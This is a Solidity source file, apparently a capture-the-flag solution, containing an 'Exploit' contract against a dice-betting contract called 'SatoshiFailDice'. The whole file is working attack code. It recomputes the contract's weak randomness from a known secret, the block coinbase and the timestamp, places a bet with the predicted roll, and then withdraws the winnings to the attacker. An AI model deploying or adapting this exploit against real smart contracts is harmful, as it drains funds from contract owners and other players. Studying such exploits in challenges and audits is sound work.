pragma solidity ^0.5.4;

import "./solutions/faildice/SatoshiFailDice.sol";

contract Exploit {
	address payable owner;
	uint big_secret;
	SatoshiFailDice public dice;

	event Success(bool success);

	constructor(uint _big_secret, address payable _caddr) public payable {
		owner = msg.sender;
		big_secret = _big_secret;
		dice = SatoshiFailDice(_caddr);
	}

	function attack() public payable {
		uint8 user_roll = uint8(42 - uint8(uint(keccak256(abi.encodePacked(address(this), block.coinbase, block.timestamp, big_secret)))));
		dice.rollDice.value(msg.value)(user_roll);
	}

	function withdraw() public {
		require(msg.sender == owner);
		owner.transfer(address(this).balance);
	}

	function() external payable { }
}